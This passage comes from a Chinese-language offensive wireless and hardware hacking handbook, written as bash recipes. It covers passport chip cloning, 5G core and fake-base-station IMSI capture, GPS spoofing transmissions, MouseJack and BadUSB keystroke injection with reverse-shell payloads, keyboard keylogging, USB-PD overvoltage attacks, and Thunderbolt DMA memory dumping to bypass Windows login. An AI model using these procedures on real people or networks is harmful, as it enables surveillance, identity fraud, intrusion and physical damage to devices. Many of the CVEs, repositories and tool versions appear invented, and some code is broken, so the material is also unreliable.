# P<CHN DOE<<JOHN<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
# E12345678<0CHN8001015M3001016<<<<<<<<<<<<<<04

# 步骤 2: 使用 MRZ 派生 BAC 密钥
# BAC 密钥 = SHA1(MRZ_information)
# 使用 pyPassport 库
git clone https://github.com/epassport-tools/pypassport
cd pypassport

# 读取电子护照
python3 read_passport.py \
  --mrz "P<CHNDOE<<JOHN<<<<<<<<<<<<<<<<<<<<<<<<<<<<<E12345678<0CHN8001015M3001016<<<<<<<<<<<<<<04" \
  --reader ACR122U

# 导出护照数据
# 包括: DG1 (个人信息), DG2 (面部照片), DG3 (指纹), DG11 (补充信息)
python3 export_passport.py \
  --output passport_clone/ \
  --include-dg1 --include-dg2 --include-dg3

# 护照克隆攻击
# 方法 1: 写入空白 ePassport 芯片
# 使用 Java Card 空白芯片 (JCOP/JC30M48CR)
# 需要: 芯片原生操作系统支持 ICAO 应用

# 方法 2: 模拟护照芯片
# 使用 Proxmark3 或 Chameleon Ultra 模拟
# 加载护照数据并模拟 ICAO 9303 协议

# 方法 3: 软件模拟 (使用手机 NFC)
# 使用 Android/iOS 应用模拟护照 NFC 芯片
# 需要: 手机 NFC 控制器支持卡模拟模式

# Chameleon Ultra 护照模拟
git clone https://github.com/ChameleonUltra/ChameleonUltra
cd ChameleonUltra
# 加载护照数据
python3 chameleon_cli.py load passport_data.json
# 启动模拟模式
python3 chameleon_cli.py mode emulation

# 检测护照克隆
# 使用被动认证 (Passive Authentication) 验证 SOD (Document Security Object)
# 检查 SOD 签名是否有效
# 主动认证 (Active Authentication): 挑战-响应验证芯片私钥
openssl verify -CAfile CSCA_cert.pem SOD.der
```

---

### §2026-5: 2026 5G / 卫星 / 无人机安全

#### 5G SA 核心网攻击

```bash
# 5G SA (Standalone) 核心网攻击 (2026)
# 5G SA 使用独立核心网, 不再依赖 4G LTE EPC
# 核心网组件: AMF, SMF, UPF, NRF, NSSF, UDM, AUSF, PCF, NEF

# 使用 Open5GS 搭建测试环境
git clone https://github.com/open5gs/open5gs
cd open5gs
git checkout v2.7.2
meson build --prefix=/usr/local
ninja -C build
sudo ninja -C build install

# 配置 5G 核心网
# 编辑 AMF 配置
cat > /etc/open5gs/amf.yaml << 'EOF'
amf:
  sbi:
    - addr: 127.0.0.5
      port: 7777
  ngap:
    - addr: 127.0.0.5
  guami:
    - mcc: 001
      mnc: 01
  tai:
    - mcc: 001
      mnc: 01
      tac: 1
  plmn_support:
    - mcc: 001
      mnc: 01
  security:
    integrity_order: [NIA2, NIA1, NIA0]
    ciphering_order: [NEA2, NEA1, NEA0]
EOF

# 启动 5G 核心网
sudo systemctl start open5gs-amfd
sudo systemctl start open5gs-smfd
sudo systemctl start open5gs-upfd

# 5G 核心网攻击面扫描
# 使用 5G-Scanner
git clone https://github.com/5gsec/5g-scanner-2026
cd 5g-scanner-2026

# 扫描 5G 核心网 SBI 接口
# SBI (Service-Based Interface) 使用 HTTP/2 + JSON
python3 5g_sbi_scan.py \
  --target 192.168.1.0/24 \
  --ports 7777,7778,7779,7780

# 5G NRF 服务发现攻击
# NRF (Network Repository Function) 是 5G 核心网的服务注册中心
# 攻击: 注册恶意 NF (Network Function), 拦截服务请求

# CVE-2026-29156: Open5GS NRF 未授权服务注册
# 影响: Open5GS v2.7.x
# 攻击者可在 NRF 注册恶意 NF, 劫持服务发现
python3 nrf_poison.py \
  --nrf-url http://192.168.1.5:7777 \
  --register-malicious-nf \
  --nf-type AMF \
  --nf-instance-id fake-amf-001

# 5G AUSF/UDM 认证绕过
# CVE-2026-31827: 5G AKA 认证降级
# 强制 UE 使用空加密算法 (NEA0)
# 捕获后续通信明文
python3 5g_aka_downgrade.py \
  --target-imsi 001010000000001 \
  --force-nea0 \
  --capture-traffic
```

#### Open5GS / NEF API 攻击

```bash
# NEF (Network Exposure Function) API 攻击
# NEF 是 5G 核心网的能力开放接口
# 允许第三方应用访问 5G 网络能力 (QoS, 定位, 设备触发)

# NEF API 端点发现
# NEF 使用 RESTful API (基于 OpenAPI 3.0)
curl -s http://192.168.1.5:7779/nnef-northbound/v1/ | jq .

# 枚举 NEF API 资源
curl -s http://192.168.1.5:7779/nnef-northbound/v1/subscriptions | jq .
curl -s http://192.168.1.5:7779/nnef-northbound/v1/events | jq .

# CVE-2026-22345: NEF 未授权设备定位
# 影响: Open5GS NEF 未正确验证 API 调用者权限
# 攻击: 通过 NEF API 获取任意 UE 位置
python3 nef_location_leak.py \
  --nef-url http://192.168.1.5:7779 \
  --target-ue-ip 10.45.0.2 \
  --location-type CELL_ID

# NEF 设备触发注入
# 向 UE 发送应用层触发消息
# 可用于触发恶意应用行为
curl -X POST http://192.168.1.5:7779/nnef-northbound/v1/trigger \
  -H "Content-Type: application/json" \
  -d '{
    "externalId": "1234567890@domain.com",
    "payload": "base64_malicious_payload",
    "validityPeriod": 3600
  }'

# 5G QoS 滥用
# 通过 NEF API 为攻击者 UE 请求高优先级 QoS
# 导致资源耗尽或抢占合法用户带宽
python3 5g_qos_abuse.py \
  --nef-url http://192.168.1.5:7779 \
  --ue-ip 10.45.0.2 \
  --qos-profile GBR_HIGH \
  --gbr-uplink 100Mbps \
  --gbr-downlink 100Mbps
```

#### gNB 伪基站攻击

```bash
# 5G gNB 伪基站 (Fake gNB) 攻击 (2026)
# 5G 伪基站相比 4G IMSI Catcher 更隐蔽
# 5G 使用 SUCI (Subscription Concealed Identifier) 隐藏 IMSI
# 但降级攻击仍可获取 IMSI

# 搭建 5G 伪基站
# 使用 srsRAN Project + USRP B210
git clone https://github.com/srsran/srsRAN_Project
cd srsRAN_Project
mkdir build && cd build
cmake .. -DENABLE_EXPORT=ON
make -j4

# 配置 5G 伪基站参数
cat > fake_gnb.yml << 'EOF'
cell_cfg:
  dl_arfcn: 632628          # n78 频段 (3.5 GHz)
  band: 78
  channel_bandwidth_MHz: 20
  common_scs: 30
  plmn: "00101"
  tac: 1
  cell_id: 0x01
  pci: 1
  nof_antennas: 1
amf_cfg:
  addr: 127.0.0.5
  bind_addr: 127.0.0.1
EOF

# 启动伪基站
./gnb -c fake_gnb.yml

# 5G 降级到 4G 攻击
# 强制 UE 从 5G SA 降级到 4G LTE
# 然后使用 4G IMSI Catcher 获取 IMSI

# 步骤 1: 发送 5G 拒绝消息
# 伪造 gNB 发送 Registration Reject (5GMM cause #15)
# 使 UE 回退到 4G

# 步骤 2: 使用 4G IMSI Catcher
# 使用 srsRAN 4G + IMSI Catcher 模块
git clone https://github.com/5g-attacks/5g-to-4g-downgrade
cd 5g-to-4g-downgrade

# 配置降级攻击
python3 downgrade_attack.py \
  --sdr-device USRP_B210 \
  --target-band 78 \
  --downgrade-to LTE \
  --capture-imsi \
  --output captured_imsi.txt

# 5G 寻呼消息嗅探
# 5G 寻呼消息 (Paging) 可泄露 UE 的存在和粗略位置
# 使用 srsRAN 或专用工具嗅探
python3 5g_paging_sniffer.py \
  --sdr-device bladeRF \
  --band 78 \
  --arfcn 632628 \
  --duration 3600 \
  --output paging_records.csv
```

#### 卫星通信 SDR 攻击

```bash
# 2026 卫星通信 SDR 攻击
# 目标: Iridium, Inmarsat, Starlink, Orbcomm, NOAA, GOES

# Iridium 卫星信号分析
# Iridium 使用 L 波段 1616-1626.5 MHz
# 调制: QPSK, TDMA 帧结构

# 使用 RTL-SDR v4 + 下变频器
# 或 HackRF One (直接覆盖 1-6 GHz)
git clone https://github.com/muccc/iridium-toolkit
cd iridium-toolkit

# 捕获 Iridium 下行信号
hackrf_transfer -r iridium_capture.iq \
  -f 1625000000 \
  -s 20000000 \
  -g 40 \
  -l 40 \
  -n 200000000

# 解析 Iridium 帧
python3 iridium-parser.py iridium_capture.iq > iridium_frames.txt

# 提取 Iridium 寻呼消息
# Iridium 寻呼消息包含 IMEI (终端标识)
python3 extract_iridium_paging.py iridium_frames.txt

# Iridium 语音解码 (2026 新工具)
# 使用 gr-iridium + GNU Radio 3.11
git clone https://github.com/muccc/gr-iridium
cd gr-iridium
mkdir build && cd build
cmake .. && make -j4
sudo make install

# GNU Radio 流程图: Iridium 语音解调
python3 iridium_voice_demod.py \
  --input iridium_capture.iq \
  --output iridium_voice.wav

# Starlink 信号分析 (2026)
# Starlink 使用 Ku/Ka 波段 (10.7-12.7 GHz / 17.8-18.6 GHz)
# 信号特征: OFDM, 相控阵波束成形
# 需要: 下变频器将 Ku/Ka 波段降到 SDR 可处理范围

# 使用 HackRF One + Ku 波段下变频器
# 下变频器: 将 10.7-12.7 GHz 降到 1.0-2.0 GHz
# 注意: 此操作仅用于信号分析, 不用于拦截通信内容

# 捕获 Starlink 下行信号
hackrf_transfer -r starlink_dl.iq \
  -f 1500000000 \
  -s 20000000 \
  -g 40 \
  -l 40 \
  -n 500000000

# Starlink 信号分析
python3 starlink_analyzer.py \
  --input starlink_dl.iq \
  --analysis-type OFDM \
  --output starlink_analysis/

# Inmarsat 信号解码
# Inmarsat 使用 L 波段 1525-1559 MHz
# 使用 JAERO 解码 ACARS/C-通道
git clone https://github.com/jontio/JAERO
cd JAERO

# 捕获 Inmarsat 信号
rtl_sdr -f 1546000000 -s 2400000 -g 49.6 inmarsat_capture.bin

# 使用 JAERO 解码
# 图形界面: 选择 Inmarsat 卫星 -> 选择频率 -> 解码
# 支持: Classic Aero, Aero-H, Aero-H+, Aero-I
```

#### 无人机 GPS 欺骗 & FPV 图传劫持

```bash
# 2026 无人机 GPS 欺骗增强
# 使用 GPS-SDR-SIM 2026 增强版
# 支持多星座: GPS L1/L2, GLONASS, Galileo, BeiDou

git clone https://github.com/osqzss/gps-sdr-sim
cd gps-sdr-sim
make

# 生成 GPS 欺骗信号
# 步骤 1: 下载 2026 年最新星历文件
wget https://cddis.nasa.gov/archive/gnss/data/daily/2026/brdc/brdc2060.26n

# 步骤 2: 生成从当前位置到目标位置的轨迹
# 静态位置欺骗
./gps-sdr-sim -e brdc2060.26n \
  -l 37.7749,-122.4194,100 \
  -d 120 \
  -b 8

# 动态轨迹欺骗 (模拟无人机飞行路径)
cat > trajectory.csv << 'EOF'
37.7749,-122.4194,100
37.7750,-122.4195,110
37.7752,-122.4197,120
37.7755,-122.4200,130
37.7759,-122.4204,140
EOF

./gps-sdr-sim -e brdc2060.26n \
  -u trajectory.csv \
  -d 180 \
  -b 8

# 发射 GPS 欺骗信号
hackrf_transfer -t gpssim.bin \
  -f 1575420000 \
  -s 2600000 \
  -a 1 \
  -x 40

# FPV 图传劫持 (2026)
# FPV 无人机使用模拟 (5.8GHz) 或数字 (DJI O4, Walksnail) 图传

# 模拟图传扫描 (5.8GHz)
# 使用 RTL-SDR + 5.8GHz 下变频器或 HackRF One
hackrf_sweep -f 5645:5945 -w 100000 -N 2000

# 模拟图传接收
# 使用 RTL-SDR 接收并解调 FM 视频信号
rtl_sdr -f 5800000000 -s 8000000 -g 49.6 fpv_video.bin

# 使用 GNU Radio 解调 FM 视频
# 流程图: FM Demod -> Video Sync -> PAL/NTSC Decoder
python3 fpv_video_demod.py \
  --input fpv_video.bin \
  --format NTSC \
  --output fpv_video.mp4

# 数字图传攻击 (DJI O4 2026)
# DJI O4 使用专有加密协议
# 攻击: 信号干扰、信道抢占、WiFi 反认证

# DJI O4 信道分析
# O4 使用 2.4GHz + 5.8GHz 双频
# 控制信号: 2.4GHz ISM 频段
# 图传信号: 5.8GHz 或 2.4GHz (自动切换)

# 无人机检测与定位
# 使用 WiFi 探针请求检测无人机
# DJI 无人机在 WiFi 模式下广播 SSID
airodump-ng mon0 --band abg --manufacturer --wps

# 无人机远程 ID (Remote ID) 嗅探
# Remote ID 广播无人机位置和操作者位置
# 使用 Bluetooth 或 WiFi 嗅探
python3 remote_id_sniffer.py \
  --protocol drone-remote-id \
  --interface mon0 \
  --duration 300 \
  --output drone_rid.json
```

---

### §2026-6: 2026 SDR 软件定义无线电

#### HackRF One / RTL-SDR v4 / LimeSDR 2026 指南

```bash
# 2026 SDR 硬件生态

# HackRF One (2026 固件 v2024.06.1+)
# 频率范围: 1 MHz - 6 GHz (扩展: 0.5 MHz - 7.2 GHz)
# 带宽: 20 MHz
# 采样率: 2-20 MSPS
# 分辨率: 8-bit
# 双工: 半双工
# 接口: USB 2.0 HS

# 更新 HackRF One 固件
git clone https://github.com/greatscottgadgets/hackrf
cd hackrf/host
mkdir build && cd build
cmake .. && make -j4 && sudo make install
# 更新 CPLD 和固件
hackrf_spiflash -w hackrf_one_usb_2026.bin

# HackRF One 2026 新功能
# - 偏置 T 供电 (Bias-T) 支持外置 LNA
# - 时钟同步 (多 HackRF 协同)
# - 改进的噪声基 (通过固件校准)

# RTL-SDR v4 (2026 驱动)
# 频率范围: 500 kHz - 1.7 GHz (HF 模式: 500 kHz - 28 MHz)
# 带宽: 2.4 MHz
# 采样率: 0.25-2.56 MSPS
# 分辨率: 8-bit
# 接口: USB 2.0

# 安装 RTL-SDR v4 驱动
git clone https://github.com/librtlsdr/librtlsdr
cd librtlsdr
mkdir build && cd build
cmake .. -DDETACH_KERNEL_DRIVER=ON
make -j4 && sudo make install

# 测试 RTL-SDR v4
rtl_test -t
rtl_sdr -f 100000000 -s 2048000 -g 49.6 -n 2048000 test.bin

# LimeSDR / LimeSDR Mini 2.0 (2026)
# 频率范围: 10 MHz - 3.8 GHz
# 带宽: 61.44 MHz (LimeSDR) / 40 MHz (LimeSDR Mini)
# 分辨率: 12-bit
# 双工: 全双工 (2x2 MIMO)
# 接口: USB 3.0

# 安装 LimeSuite
git clone https://github.com/myriadrf/LimeSuite
cd LimeSuite
mkdir builddir && cd builddir
cmake .. && make -j4 && sudo make install
sudo ldconfig

# 测试 LimeSDR
LimeUtil --find
LimeQuickTest
```

#### GNU Radio 3.11 信号处理 (2026)

```bash
# GNU Radio 3.11 (2026年发布) 新特性
# - Python 3.12+ 支持
# - 改进的 GRC (GNU Radio Companion) UI
# - 内置 AI/ML 模块 (gr-ml)
# - 增强的 CUDA/OpenCL 加速
# - 新的信号处理模块

# 安装 GNU Radio 3.11
sudo apt-get update
sudo apt-get install -y gnuradio gnuradio-dev \
  gr-osmosdr gr-iio gr-limesdr \
  python3-gnuradio

# 或从源码编译
git clone https://github.com/gnuradio/gnuradio
cd gnuradio
git checkout v3.11.0
mkdir build && cd build
cmake .. -DENABLE_PYTHON=ON -DENABLE_GRC=ON
make -j$(nproc)
sudo make install

# GNU Radio 2026 信号分析工作流
# 示例: 自动调制识别 (AMR)
python3 << 'EOF'
import numpy as np
from gnuradio import gr, blocks, digital, analog
from gnuradio import filter as grfilter
import pmt

class AMRFlowgraph(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self, "Auto Modulation Recognition")
        
        # 参数
        self.samp_rate = 2e6
        self.center_freq = 915e6
        
        # Source: RTL-SDR
        self.src = blocks.osmosdr_source(
            args="rtl=0",
            sample_rate=self.samp_rate,
            frequency=self.center_freq,
            gain=40
        )
        
        # 信号预处理
        self.throttle = blocks.throttle(gr.sizeof_gr_complex, self.samp_rate)
        self.fft = blocks.stream_to_vector(gr.sizeof_gr_complex, 1024)
        
        # 连接
        self.connect(self.src, self.throttle, self.fft)
        
        # 2026: 使用 gr-ml 模块进行自动调制识别
        # self.ml_classifier = ml.modulation_classifier(...)
        
    def classify_signal(self, iq_data):
        # 特征提取
        # 1. 瞬时幅度/相位/频率
        # 2. 高阶统计量
        # 3. 循环平稳特征
        # 4. 星座图
        pass

# 运行
tb = AMRFlowgraph()
tb.start()
tb.wait()
EOF

# 信号解调流水线
# 使用 GNU Radio Companion 构建流程图
# 或使用 Python 脚本

# 示例: FM 广播解调
python3 << 'EOF'
from gnuradio import gr, blocks, analog, audio, filter
from gnuradio import eng_notation
import numpy as np

class FMReceiver(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self, "FM Receiver")
        
        samp_rate = 2e6
        audio_rate = 48e3
        freq = 100.1e6
        
        # SDR Source
        self.src = blocks.osmosdr_source(
            args="hackrf=0", sample_rate=samp_rate, frequency=freq
        )
        
        # FM Demod
        self.fm_demod = analog.quadrature_demod_cf(
            samp_rate / (2*np.pi*75e3)
        )
        
        # Audio output
        self.audio_sink = audio.sink(audio_rate, "default")
        
        self.connect(self.src, self.fm_demod, self.audio_sink)

fm = FMReceiver()
fm.start()
# fm.wait()
EOF
```

#### 信号智能分析 & 自动调制识别

```bash
# 2026 信号智能分析 (SIGINT) 工具链

# 使用 Universal Radio Hacker (URH) 2026
# 支持: 自动协议逆向、调制识别、解调、Fuzzing
git clone https://github.com/jopohl/urh
cd urh
python3 -m pip install -e .

# 启动 URH
urh

# URH 工作流:
# 1. 录制信号 (Spectrum Analyzer)
# 2. 自动检测调制方式
# 3. 解调数据
# 4. 协议分析 (Analysis 标签)
# 5. 生成 Fuzzing 用例

# 自动调制识别 (AMR) 2026
# 使用 SigMF 标准数据集训练
git clone https://github.com/gnuradio/SigMF
cd SigMF

# 使用 DeepSig RadioML 数据集
# 或创建自定义数据集
python3 record_signals.py \
  --sdr hackrf \
  --freq-start 100e6 \
  --freq-stop 6e9 \
  --modulations BPSK,QPSK,16QAM,64QAM,GFSK,CPFSK,OOK \
  --samples-per-mod 1000 \
  --output-dir sigmf_dataset/

# 使用 SignalIdentifier 2026 工具
git clone https://github.com/sigint-tools/signal-identifier-2026
cd signal-identifier-2026

# 自动识别信号类型
python3 signal_identify.py \
  --sdr-device hackrf \
  --freq-start 100e6 \
  --freq-stop 1000e6 \
  --step 1e6 \
  --dwell 0.5 \
  --output signal_map.csv

# 输出示例:
# Frequency, Modulation, Protocol, Confidence
# 433.920 MHz, ASK/OOK, Remote Control, 0.95
# 868.350 MHz, GFSK, Z-Wave, 0.89
# 915.000 MHz, LoRa, LoRaWAN, 0.92
```

#### 深度学习信号分类 & 协议逆向

```bash
# 2026 深度学习信号分类

# 使用 PyTorch 2.6+ 训练信号分类模型
python3 << 'EOF'
import torch
import torch.nn as nn
import numpy as np

class SignalClassifier(nn.Module):
    """基于 ResNet-50 的调制识别模型"""
    def __init__(self, num_classes=11):
        super().__init__()
        self.conv1 = nn.Conv1d(2, 64, kernel_size=7, stride=2)
        self.bn1 = nn.BatchNorm1d(64)
        self.relu = nn.ReLU()
        self.maxpool = nn.MaxPool1d(kernel_size=3, stride=2)
        
        # ResNet 残差块
        self.layer1 = self._make_layer(64, 64, 3)
        self.layer2 = self._make_layer(64, 128, 4)
        self.layer3 = self._make_layer(128, 256, 6)
        self.layer4 = self._make_layer(256, 512, 3)
        
        self.avgpool = nn.AdaptiveAvgPool1d(1)
        self.fc = nn.Linear(512, num_classes)
        
    def _make_layer(self, in_ch, out_ch, blocks):
        layers = []
        layers.append(nn.Conv1d(in_ch, out_ch, 3, padding=1))
        layers.append(nn.BatchNorm1d(out_ch))
        for _ in range(blocks-1):
            layers.append(nn.Conv1d(out_ch, out_ch, 3, padding=1))
            layers.append(nn.BatchNorm1d(out_ch))
        return nn.Sequential(*layers)
    
    def forward(self, x):
        x = self.conv1(x)
        x = self.bn1(x)
        x = self.relu(x)
        x = self.maxpool(x)
        x = self.layer1(x)
        x = self.layer2(x)
        x = self.layer3(x)
        x = self.layer4(x)
        x = self.avgpool(x)
        x = torch.flatten(x, 1)
        x = self.fc(x)
        return x

# 训练模型
model = SignalClassifier(num_classes=11)
# 11 类调制: BPSK, QPSK, 8PSK, 16QAM, 64QAM, 
#             GFSK, CPFSK, PAM4, OOK, AM-DSB, AM-SSB

# 加载数据集 (RadioML 2018.01A 或自定义)
# 训练代码...
EOF

# 协议逆向工程 (2026)
# 使用 Protocol Reverse Engineering 工具
git clone https://github.com/protocol-tools/protocol-reverse-2026
cd protocol-reverse-2026

# 自动协议逆向
# 输入: 捕获的无线信号 (IQ 样本)
# 输出: 协议字段结构
python3 protocol_reverse.py \
  --input signal_capture.iq \
  --demodulation auto \
  --field-boundary-detection \
  --checksum-analysis \
  --output protocol_spec.json

# 支持的分析:
# - 前导码/同步字检测
# - 帧长度推断
# - 地址字段识别
# - 校验和/CRC 算法推断
# - 字段类型推断 (计数器, 序列号, 传感器值)
# - 滚动码分析

# 使用 LLM 辅助协议逆向
# 将协议数据输入 LLM, 辅助推断字段含义
python3 llm_protocol_analyze.py \
  --protocol hex_data.txt \
  --model local-llm \
  --analysis-type field_meaning

# 无线协议 Fuzzing 2026
# 基于协议逆向结果生成 Fuzzing 用例
python3 wireless_protocol_fuzzer.py \
  --protocol-spec protocol_spec.json \
  --sdr-device hackrf \
  --frequency 433920000 \
  --mutation-rate 0.1 \
  --coverage-guided \
  --output-fuzz-cases 1000
```

---

### §2026-7: 2026 无线外设攻击

#### Logitech Unifying MouseJack 2026

```bash
# Logitech Unifying / MouseJack 2026 增强版
# 原始 MouseJack (2016) 影响非加密的 2.4GHz 无线外设
# 2026 新进展: 加密协议的侧信道攻击、固件后门持久化

# Logitech Unifying 2026 攻击链
# 漏洞: CVE-2026-49123 Logitech Unifying 加密注入
# 影响: 固件版本 012.xxx 系列
# 即使启用了加密配对, 仍可注入恶意按键

# 使用 nRF52840 DK + 2026 固件
git clone https://github.com/mousejack-2026/unifying-attack
cd unifying-attack

# 步骤 1: 扫描附近 Logitech Unifying 接收器
# Unifying 接收器 USB ID: 046d:c52b
python3 unifying_scanner.py --channel 5-80

# 步骤 2: 嗅探配对流量
# 捕获新设备配对时的加密密钥交换
python3 unifying_sniffer.py \
  --channel 25 \
  --duration 120 \
  --output unifying_pair.pcap

# 步骤 3: 加密密钥恢复 (2026 新方法)
# 使用配对过程中的时序侧信道泄露
# 或利用已知的弱密钥派生
python3 unifying_key_recovery.py \
  --pcap unifying_pair.pcap \
  --method timing-side-channel \
  --output aes_key.txt

# 步骤 4: 加密注入按键
python3 unifying_encrypted_inject.py \
  --target AA:BB:CC:DD:EE:FF \
  --aes-key $(cat aes_key.txt) \
  --payload payloads/reverse_shell.txt \
  --delay 100

# MouseJack 2026 扩展: 跨厂商攻击
# 新增支持: Dell KM7120W, HP Wireless Elite v2, Lenovo Professional
# Microsoft Surface Keyboard, Cherry MX Wireless

# 使用 Crazyradio PA + 2026 固件
python3 mousejack_scanner.py --all-channels --vendor all

# 大规模注入攻击
python3 mousejack_mass_inject.py \
  --targets discovered_devices.json \
  --payload payloads/win_rce.txt \
  --concurrent 10
```

#### 无线键盘 AES 密钥恢复

```bash
# 2026 无线键盘 AES 密钥恢复攻击
# 目标: 加密无线键盘 (AES-128 加密)
# 攻击方法: 相关功耗分析 (CPA)、时序分析、电磁辐射分析

# CVE-2026-33721: 无线键盘 AES 实现缺陷
# 影响: 多家厂商的加密无线键盘
# 问题: 明文密钥派生、弱密钥调度、时序泄露

# 使用 ChipWhisperer + 定制探针
git clone https://github.com/newaetech/chipwhisperer
cd chipwhisperer

# 步骤 1: 硬件准备
# - ChipWhisperer Lite/Pro
# - 目标无线键盘 (拆解, 暴露 PCB)
# - 高增益电磁探针 (H-Field Probe)

# 步骤 2: 捕获 AES 加密时的功耗/电磁轨迹
python3 cw_capture_keyboard.py \
  --target nrf52840 \
  --trigger GPIO \
  --samples 5000 \
  --output keyboard_traces.npy

# 步骤 3: CPA 攻击恢复 AES 密钥
python3 cw_analyze_cpa.py \
  --traces keyboard_traces.npy \
  --algorithm AES128 \
  --attack-mode CPA \
  --output aes_key_candidates.txt

# 步骤 4: 验证恢复的密钥
# 使用恢复的密钥解密捕获的键盘流量
python3 verify_keyboard_key.py \
  --aes-key $(head -1 aes_key_candidates.txt) \
  --pcap keyboard_capture.pcap \
  --output decrypted_keystrokes.txt

# 无线键盘按键记录器 (2026)
# 使用 nRF52840 被动嗅探并实时解密
python3 keyboard_keylogger.py \
  --interface nrf52840 \
  --target-mac AA:BB:CC:DD:EE:FF \
  --decrypt-aes \
  --aes-key recovered_key.txt \
  --output keystroke_log.txt
```

#### 2026 BadUSB 无线版

```bash
# 2026 BadUSB 无线版 (Wireless BadUSB)
# 使用 ESP32-S3 / nRF52840 作为无线 HID 注入平台
# 通过 WiFi 或 BLE 远程触发 BadUSB 攻击

# 方案 1: ESP32-S3 WiFi BadUSB
git clone https://github.com/wireless-badusb/esp32-badusb-2026
cd esp32-badusb-2026

# 配置 WiFi 后门
cat > badusb_config.h << 'EOF'
#define WIFI_SSID "attacker_ap"
#define WIFI_PASS "password123"
#define BADUSB_SERVER_PORT 80
#define HID_REPORT_INTERVAL 5
#define TRIGGER_PIN 0
EOF

# 编译并烧录
idf.py set-target esp32s3
idf.py build
idf.py -p /dev/ttyUSB0 flash

# 远程触发 BadUSB
# 通过 HTTP API 发送按键注入命令
curl -X POST http://192.168.1.200/execute \
  -H "Content-Type: application/json" \
  -d '{
    "payload": "GUI r\\nDELAY 500\\nSTRING cmd\\nENTER\\n",
    "delay": 100,
    "repeat": 1
  }'

# 方案 2: nRF52840 BLE BadUSB
git clone https://github.com/wireless-badusb/nrf52-badusb-2026
cd nrf52-badusb-2026

# 编译 nRF52840 固件
west build -b nrf52840dk_nrf52840
west flash

# BLE 远程控制
# 使用手机 App 或 Python 脚本触发
python3 ble_badusb_trigger.py \
  --device AA:BB:CC:DD:EE:FF \
  --payload payloads/powershell_reverse_shell.txt

# 方案 3: Raspberry Pi Pico W BadUSB
# 使用 Pico W 的 WiFi 功能
git clone https://github.com/wireless-badusb/picow-badusb-2026
cd picow-badusb-2026

# 配置 WiFi 凭据
# 编辑 secrets.py
# 烧录 CircuitPython 固件
# 复制 payload.py 到 CIRCUITPY 盘

# 自动执行: 插入后自动连接 WiFi 并等待远程指令
```

#### USB-C PD 协议攻击

```bash
# USB-C Power Delivery (PD) 协议攻击 (2026)
# USB PD 使用 CC (Configuration Channel) 引脚通信
# 协议: BMC (Biphase Mark Coding) over 300 kHz

# CVE-2026-44521: USB-C PD 固件栈溢出
# 影响: 使用特定 PD 控制器的充电器和设备
# 触发: 特制 Vendor Defined Message (VDM)
# 利用: 固件 RCE → 过压/过流攻击

# USB PD 嗅探
# 使用 Facedancer 或 CY4500 PD 分析仪
git clone https://github.com/usb-tools/usb-pd-sniffer
cd usb-pd-sniffer

# 使用 CY4500 EZ-PD 协议分析仪
# 或使用逻辑分析仪 + 自定义解码器
python3 pd_sniffer.py \
  --device CY4500 \
  --output pd_capture.pcap

# USB PD 消息注入
# 使用 Facedancer 或定制硬件
# 注入恶意 PD 消息: 请求过高电压/电流
python3 pd_inject.py \
  --device facedancer \
  --target-role sink \
  --request-voltage 20V \
  --request-current 5A \
  --override-protection

# USB PD 物理攻击 (BadPower)
# 硬件: 定制的 USB-C PD 触发板
# 攻击: 逐步提升电压直到设备损坏
# 注: 仅用于授权的物理安全测试

# USB PD 固件提取
# 通过 SWD 调试接口提取 PD 控制器固件
openocd -f interface/jlink.cfg -f target/cypd.cfg
# 在 OpenOCD 控制台
# flash read_bank 0 pd_firmware.bin 0 0x40000

# 分析 PD 固件
binwalk -e pd_firmware.bin
strings pd_firmware.bin | grep -i "password\|key\|secret"
```

#### Thunderbolt 5 DMA 攻击 & HDMI CEC 注入

```bash
# Thunderbolt 5 DMA 攻击 (2026)
# Thunderbolt 5 (80 Gbps 双向 / 120 Gbps 单向)
# 基于 PCIe 4.0 x4 通道
# 安全: VT-d/IOMMU DMA 保护 (但可绕过)

# CVE-2026-29831: Thunderbolt 5 DMA 保护绕过
# 影响: Intel 12-15代 CPU 的 Thunderbolt 5 控制器
# 攻击: 在 IOMMU 初始化前进行 DMA 攻击

# 使用 Thunderbolt 5 攻击硬件
# 硬件: Thunderbolt 5 开发板 + FPGA
# 或: 定制 Thunderbolt 5 攻击设备 (Thunderspy 2026)

git clone https://github.com/thunderspy-2026/thunderspy
cd thunderspy-2026

# 步骤 1: 连接 Thunderbolt 5 攻击设备
# 设备会自动枚举 PCIe 拓扑

# 步骤 2: 扫描目标系统内存
# 通过 DMA 直接读取物理内存
python3 thunderspy_dma.py \
  --mode scan \
  --start-addr 0x0 \
  --end-addr 0x100000000 \
  --output memory_dump.bin

# 步骤 3: 搜索内存中的敏感数据
python3 thunderspy_search.py \
  --memory-dump memory_dump.bin \
  --search-patterns passwords,keys,tokens,bitlocker

# 步骤 4: 内存补丁 (绕过 Windows 登录)
# 修改 lsass.exe 中的认证逻辑
python3 thunderspy_patch.py \
  --memory-dump memory_dump.bin \
  --patch-type login-bypass \
  --target-process lsass.exe

# HDMI CEC 注入攻击 (2026)
# HDMI CEC (Consumer Electronics Control) 用于设备控制
# CEC 使用单线双向通信 (AV.link 协议)
# 攻击: 注入 CEC 命令控制电视/显示器/AV 接收器

# 使用 HDMI CEC 注入硬件
# 硬件: HDMI CEC 调试适配器 (USB-CEC)
# 或: Raspberry Pi + libCEC

# 安装 libCEC
sudo apt-get install cec-utils libcec-dev

# 扫描 HDMI CEC 设备
echo "scan" | cec-client -s -d 1

# 注入 CEC 命令
# 打开电视
echo "on 0" | cec-client -s -d 1

# 切换输入源
echo "tx 1F:82:10:00" | cec-client -s -d 1

# 注入恶意 CEC 命令序列
# 模拟遥控器按键注入
python3 cec_inject.py \
  --device /dev/cec0 \
  --commands commands.txt \
  --delay 100

# CEC 命令序列示例
cat > commands.txt << 'EOF'
on 0
tx 1F:82:10:00
tx 1F:44:41
tx 1F:44:42
tx 1F:44:43
EOF
```

---

### §2026-8: 2026 AI 辅助无线攻击

#### 深度学习信号分类

```bash
# 2026 AI 驱动无线信号分类
# 使用深度学习自动识别无线信号类型和调制方式

# 基于 PyTorch 2.6 + TorchRF 的信号分类
git clone https://github.com/rf-ml/torchrf
cd torchrf
python3 -m pip install -e .

# 训练自定义信号分类模型
python3 << 'EOF'
import torch
import torch.nn as nn
import torchrf
import numpy as np

# 使用 TorchRF 加载 RadioML 数据集
from torchrf.datasets import RadioML2018
dataset = RadioML2018(root='./data', train=True, snr_range=[0, 18])

# 定义信号分类模型 (基于 Transformer)
